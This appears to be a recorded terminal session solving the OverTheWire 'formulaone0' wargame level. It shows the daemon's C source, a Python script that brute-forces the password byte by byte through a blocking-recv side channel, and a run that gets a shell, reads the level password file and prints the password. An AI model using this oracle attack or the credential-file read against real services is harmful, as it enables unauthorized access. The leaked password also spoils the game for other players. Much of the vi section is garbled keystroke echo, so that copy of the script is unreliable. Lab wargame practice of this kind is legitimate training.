@@ -1,0 +1,296 @@
+bash-5.2$ export PS1='client$ '
+client$ ssh -o StrictHostKeyChecking=accept-new -o ServerAliveInterval=15 -o ServerAliveCountMax=4 -o HostKeyAlgorithms=+ssh-rsa,ssh-dss -o KexAlgorithms=+diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1 formulaone0@drifter.labs.overthewire.org -p 2232
+             __                            _                        
+            / _| ___  _ __ _ __ ___  _   _| | __ _  ___  _ __   ___ 
+           | |_ / _ \| '__| '_ ` _ \| | | | |/ _` |/ _ \| '_ \ / _ \
+           |  _| (_) | |  | | | | | | |_| | | (_| | (_) | | | |  __/
+           |_|  \___/|_|  |_| |_| |_|\__,_|_|\__,_|\___/|_| |_|\___|
+                                                                    
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+backend: gibson-0
+formulaone0@drifter.labs.overthewire.org's password: 
+
+      ,----..            ,----,          .---.
+     /   /   \         ,/   .`|         /. ./|
+    /   .     :      ,`   .'  :     .--'.  ' ;
+   .   /   ;.  \   ;    ;     /    /__./ \ : |
+  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
+  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
+  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
+  .   |  ' ' ' : `----'  |  |  \   ;  `      |
+  '   ;  \; /  |     '   :  ;   .   \    .\  ;
+   \   \  ',  /      |   |  '    \   \   ' \ |
+    ;   :    /       '   :  |     :   '  |--"
+     \   \ .'        ;   |.'       \   \ ;
+  www. `---` ver     '---' he       '---" ire.org
+
+
+Welcome to OverTheWire!
+
+If you find any problems, please report them to the #wargames channel on
+discord or IRC.
+
+--[ Playing the games ]--
+
+  This machine might hold several wargames.
+  If you are playing "somegame", then:
+
+    * USERNAMES are somegame0, somegame1, ...
+    * Most LEVELS are stored in /somegame/.
+    * PASSWORDS for each level are stored in /etc/somegame_pass/.
+
+  Write-access to homedirectories is disabled. It is advised to create a
+  working directory with a hard-to-guess name in /tmp/.  You can use the
+  command "mktemp -d" in order to generate a random and hard to guess
+  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
+  restricted so that users cannot snoop on eachother. Files and directories
+  with easily guessable or short names will be periodically deleted! The /tmp
+  directory is regularly wiped.
+  Please play nice:
+
+    * don't leave orphan processes running
+    * don't leave exploit-files laying around
+    * don't annoy other players
+    * don't post passwords or spoilers
+    * again, DONT POST SPOILERS!
+      This includes writeups of your solution on your blog or website!
+
+--[ Tips ]--
+
+  This machine has a 64bit processor and many security-features enabled
+  by default, although ASLR has been switched off.  The following
+  compiler flags might be interesting:
+
+    -m32                    compile for 32bit
+    -fno-stack-protector    disable ProPolice
+    -Wl,-z,norelro          disable relro
+
+  In addition, the execstack tool can be used to flag the stack as
+  executable on ELF binaries.
+
+  Finally, network-access is limited for most levels by a local
+  firewall.
+
+--[ Tools ]--
+
+ For your convenience we have installed a few useful tools which you can find
+ in the following locations:
+
+    * gef (https://github.com/hugsy/gef) in /opt/gef/
+    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
+    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
+    * pwntools (https://github.com/Gallopsled/pwntools)
+    * radare2 (http://www.radare.org/)
+
+--[ More information ]--
+
+  For more information regarding individual wargames, visit
+  http://www.overthewire.org/wargames/
+
+  For support, questions or comments, contact us on discord or IRC.
+
+  Enjoy your stay!
+
+formulaone0@formulaone:~$ id
+uid=20000(formulaone0) gid=20000(formulaone0) groups=20000(formulaone0)
+formulaone0@formulaone:~$ ls -la /formulaone/formulaone0.c
+-rwxr-xr-x 1 formulaone0 formulaone0 1845 Oct 25 13:38 /formulaone/formulaone0.c
+formulaone0@formulaone:~$ cat /formulaone/formulaone0.c
+#include <stdio.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <string.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <signal.h>
+
+#define PORT 4091
+
+int createsocket(int portno)
+{
+  int yes = 1;
+	struct sockaddr_in addr;
+	bzero(&addr, sizeof(addr));
+	addr.sin_family = AF_INET;
+	addr.sin_addr.s_addr = INADDR_ANY;
+	addr.sin_port = htons(portno);
+	
+	int sock = socket(AF_INET, SOCK_STREAM, 0);
+	if (sock < 0)
+	{
+		perror("open socket failed");
+		return -1;
+	}
+	
+	setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int));
+	
+	if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0)
+	{
+		perror("bind failed");
+		close(sock);
+		return -1;
+	}
+	
+	if (listen(sock, 5) < 0)
+	{
+		perror("listen failed");
+		close(sock);
+		return -1;
+	}
+	
+	return sock;
+}
+
+
+int read_byte(int fd) {
+  int ret;
+  char buf = 0;
+//  sleep(1);
+  ret = recv(fd, &buf, 1, 0);
+  if(ret == 0) { printf("RECV FAIL :(\n"); return -1; }
+  if(ret < 0) return 0;
+  
+  return buf & 0xff;
+}
+
+#ifndef PASSWD
+#define PASSWD "s3cret"
+#endif
+
+void client(int fd)
+{
+  int i = 0;
+  
+  send(fd, "Password: ", 10, 0);
+  for(i=0; i < strlen(PASSWD); i++){
+    if( PASSWD[i] != read_byte(fd) ){
+      break;
+    }
+  }
+
+  if(i != strlen(PASSWD) ) {  
+    send(fd, "WRONG PASSWORD\n", 15, 0);
+    close(fd);
+  } else { 
+    dup2(fd,0);
+    dup2(fd,1);
+    dup2(fd,2);
+    
+    system("/bin/sh");
+    printf("system just closed\n");
+  }
+  return;
+}
+
+int main()
+{
+  int fd;
+  int n;
+	struct sockaddr_in addr;
+	socklen_t addrlen = sizeof(addr);
+
+	signal(SIGCHLD, SIG_IGN);
+
+	
+	fd = createsocket(PORT);
+  
+  while(1){
+    n = accept(fd, (struct sockaddr *)&addr, &addrlen);
+//    printf("[+] Connection from %s\n", inet_ntoa(addr.sin_addr));
+    if( fork() == 0 ) {
+      close(fd);
+      client(n);
+      exit(0);
+    }  else {
+      close(n);
+    }
+  }
+}
+
+
+formulaone0@formulaone:~$ mkdir -p /run/screen/f0 && cd /run/screen/f0
+formulaone0@formulaone:/run/screen/f0$ vi /run/screen/f0/f1_solve.py
+[>4;2m="/run/screen/f0/f1_solve.py" 44L, 1140B▽  Pzz\[0%m           [>cimport socket, string, time
+HOST, PORT = "127.0.0.1", 4091def probe(prefix):s = socket.create_connection((HOST, PORT), timeout=5)
+    s.recv(20)
+    s.sendall(prefix)
+    s.settimeout(1.5)
+    try:r = s.recv(50)return "WRONG" if b"WRONG" in r else "DATA"
+    except socket.timeout:return "BLOCKED"   # correct byte: daemon blocks in recv
+    finally:s.close()
+chars = [c.encode() for c in string.ascii_letters + string.digits + "_-{}!@#$%^&*()"]
+pw = b""
+for pos in range(32):
+    for c in chars:if probe(pw + c) == "BLOCKED":pw += cprint("pos", pos, "->", pw.decode(), flush=True)break
+    else:break
+print("PASSWORD:", pw.decode(), flush=True)
+s = socket.create_connection((HOST, PORT), timeout=5)
+s.recv(20)
+s.sendall(pw)
+time.sleep(0.5)
+s.sendall(b"id\n")
+time.sleep(0.5)
+s.sendall(b"cat /etc/formulaone_pass/formulaone0\n")
+time.sleep(1)1,1Top^[  ^[  :set noai nocin nosi indentexpr= formatoptions=1,1TopdG  ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   --No lines in buffer--0,0-1Alli -- INSERT --0,1Alli1,2m3p4o5r6import78s9o10c1k2e3t4,56s7t8str9stri20n1g2,34tim7e82,1 H2O3S4T5,67P8O9R10T12=34"516278.9020.102.314"5,674809930113,1 d2e3def45p6r7o8b9e10(1p2r3e4f5i6x7)(prefix)8:(prefix)94,1 2345s67=89s10o1c2k3e4t5.6c7r8e9a20t1e2_3c4o5n6n7e8c9t30i1o2n3(4(5H6O7S8T9,401P2O3R4T5)()6,()78t9i50m1e2o3u4t5=657)()8()5,1 2345s6.7r8e9c10v1(22304)()5()6,1 2345s6.7s8e9n10d1a2l3l4(5pr7e8f9i20x1)(prefix)2(prefix)7,1 2345s6.7s8e9t10t1i2m3e4o5u6t7(819.2051)()2()8,1 2345t6r7try8:99,123456789r101=23s4.5r6e7c8v9(205102)()3()10,123456789r10e1t2u3r4return56"7W8R9O20N1G2"34i5if67b8b"9W30R1O2N3G4"56i7in89r401e2l3s4else56"7D8A9T50A1"21,1 2345e6x7c8e9p10except12s3o4c5k6et.9t20i1m2e3o4u5t6:72,1 23456789r10e1t2u3r4return56"7B8L9O20C1K2E3D4"5678#9 30c1o2r3r4e5c6t7 8b9y40t1e2:3 4d5a6e7m8o9n50 1b2l3o4c5k6s7 8i9n60 1r2e3c4v53,1 2345f6i7n8a9l10l1    finally2:34,1 23456789s10.1c2l3o4s5e6(7)()8()5,1 c2h3a4r5s67=89[10c1.2e3n4c5o6d7e8(9)()20()1f2o3for45c67i8in930s1t2str3stri4n5g6.7a8as9asc40ii_3l4e5t6t7e8r9s501+23s4t5str6stri7n8g9.60d1i2g3i4t5s67+89"70_1-2{3}{}4!{}5@6#7$8%9^80&1*2(3)()4"()5][]6[]6,1 p2w34=56b7b"8"97,1f2o3for45p6o7s89i10in12r3a4n5g6range7(839220)()1:()28,1 2345f6o7for89c101i2in34c5h6a7r8s9:209,1 23456789i10if12p3r4o5b6e7(8p9w201+23c4)(pw + c)5(pw + c)6=7=89"30B1L2O3C4K5E6D7"8:920,1 2345678910123p4w56+7=89c201,1 2345678910123p4r5i6n7print8(9"20p1o2s3"4,56p7o8s9,301"2-3>4"5,67p8w9.40d1e2c3o4d5e6(7)()8,()950f1l2u3s4h5=6T7r8u9True60)()1()2,1 2345678910123b4r5e6a7break83,1 2345e6l7s8else9:104,1 23456789b10r1e2a3break45,1 p2r3i4n5print6(7"8P9A10S1S2W3O4R5D6:7"8,920p1w2.3d4e5c6o7d8e9(30)()1,()23f4l5u6s7h8=9T40r1u2True3)()4()6,1 s23=45s6o7c8k9e10t1.2c3r4e5a6t7e8_9c20o1n2n3e4c5t6i7o8n9(30(1H2O3S4T5,67P8O9R40T1)()2,()34t5i6m7e8o9u50t1=253)()4()7,1 s2.3r4e5c6v7(829010)()1()8,1 s2.3s4e5n6d7a8l9l10(1p2w3)(pw)4
+~                                                                                                   29,1Bot(pw)
+t2i3m4e5.6s7l8e9e10p1(203.455)()6
+~                                                                                                   30,1Bot()
+s2.3s4e5nd7a8l9l10(1b2b"3i4d5\6n7"8)()9
+~                                                                                                   31,1Bot()
+t2i3m4e5.6s7l8e9e10p1(203.455)()6
+~                                                                                                   32,1Bot()
+s2.3s4e5n6d7a8l9l10(1b2b"3c4a5t6 7/8e9t20c1/2f3o4r5m6u7l8a9o30n1e2_3p4a5s6s7/8f9o40r1m2u3l4a5o6n7e809\50n1"2)()3
+~                                                                                                   33,1Bot()
+t2i3m4e5.6s7l8e9e10p1(213)()4
+~                                                                                                   34,1Bot()
+s2.3s4e5t6t7i8m9e10o1u2t3(44)()6
+~                                                                                                   35,1Bot()
+d2a3t4a56=78b9b"10"1
+~                                                                                                   36,1Bott2r3try4:57,12345w6h7i8l9while101T2r3u4True5:68,1 23456789c101=23s4.5r6e7c8v9(2041029364)()5()9,1 23456789i10if12n3o4not56c7:89b20r1e2a3break440,1 23456789d10a1t2a34+5=67c81,1 e2x3c4e5p6except78s9o10c1k2e3t4.5t6i7m8e9o20u1t2:3
+42,1Bot2345p6a7s8pass9
+43,1Botp2r3i4n5print6(7"8S9H10E1L2L3 4O5U6T7P8U9T20:1\2n3"45+67d8a9t30a1.2d3e4c5o6d7e8(9"40l1a2t3i4n5-617"8)()9)(())50
+44,1Bot()
+^[  44,0-1Bot:wq[>4;m"f1_solve.py" 44L, 1140B written
+>[>4;mformulaone0@formulaone:/run/screen/f0$ timeout 300 python3 /run/screen/f0/f1_solve.py
+pos 0 -> U
+pos 1 -> U6
+pos 2 -> U6p
+pos 3 -> U6py
+pos 4 -> U6pyn
+pos 5 -> U6pyn4
+pos 6 -> U6pyn4b
+pos 7 -> U6pyn4b5
+pos 8 -> U6pyn4b5D
+pos 9 -> U6pyn4b5DV
+pos 10 -> U6pyn4b5DVh
+pos 11 -> U6pyn4b5DVhJ
+pos 12 -> U6pyn4b5DVhJd
+pos 13 -> U6pyn4b5DVhJdb
+pos 14 -> U6pyn4b5DVhJdby
+pos 15 -> U6pyn4b5DVhJdbyT
+pos 16 -> U6pyn4b5DVhJdbyTD
+pos 17 -> U6pyn4b5DVhJdbyTD7
+pos 18 -> U6pyn4b5DVhJdbyTD7f
+pos 19 -> U6pyn4b5DVhJdbyTD7fO
+pos 20 -> U6pyn4b5DVhJdbyTD7fOB
+pos 21 -> U6pyn4b5DVhJdbyTD7fOBl
+pos 22 -> U6pyn4b5DVhJdbyTD7fOBln
+pos 23 -> U6pyn4b5DVhJdbyTD7fOBlny
+pos 24 -> U6pyn4b5DVhJdbyTD7fOBlnyx
+pos 25 -> U6pyn4b5DVhJdbyTD7fOBlnyxk
+pos 26 -> U6pyn4b5DVhJdbyTD7fOBlnyxkS
+pos 27 -> U6pyn4b5DVhJdbyTD7fOBlnyxkSo
+pos 28 -> U6pyn4b5DVhJdbyTD7fOBlnyxkSoz
+pos 29 -> U6pyn4b5DVhJdbyTD7fOBlnyxkSozc
+pos 30 -> U6pyn4b5DVhJdbyTD7fOBlnyxkSozcT
+pos 31 -> U6pyn4b5DVhJdbyTD7fOBlnyxkSozcTQ
+PASSWORD: U6pyn4b5DVhJdbyTD7fOBlnyxkSozcTQ
+SHELL OUTPUT:
+uid=20000(formulaone0) gid=20000(formulaone0) groups=20000(formulaone0)
+U6pyn4b5DVhJdbyTD7fOBlnyxkSozcTQ
+
+formulaone0@formulaone:/run/screen/f0$ 
